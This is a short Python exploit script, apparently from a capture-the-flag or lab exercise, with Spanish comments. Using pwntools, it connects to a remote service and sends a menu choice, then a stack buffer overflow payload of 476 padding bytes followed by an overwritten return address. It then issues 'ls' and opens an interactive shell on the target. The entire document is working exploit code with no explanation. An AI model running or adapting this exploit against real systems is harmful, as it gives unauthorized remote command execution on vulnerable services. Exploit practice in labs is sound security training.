import pwn 
import sys

if len(sys.argv) != 3:
  raise Exception("Argumentos incorrectos: python pwnRemote.py ip puerto")

# En nuestro caso: python3 pwnRemote.py 127.0.0.1 54471

p = pwn.remote(sys.argv[1], sys.argv[2])

offset = 476

new_eip = b'i\xb0\x04\x08'

payload = b"".join(
  [
    b"A" * offset,
    new_eip,
  ]  
)

payload += b"\n"

p.sendline(b"1")
p.sendline(payload)
p.sendline(b"ls")
p.interactive()
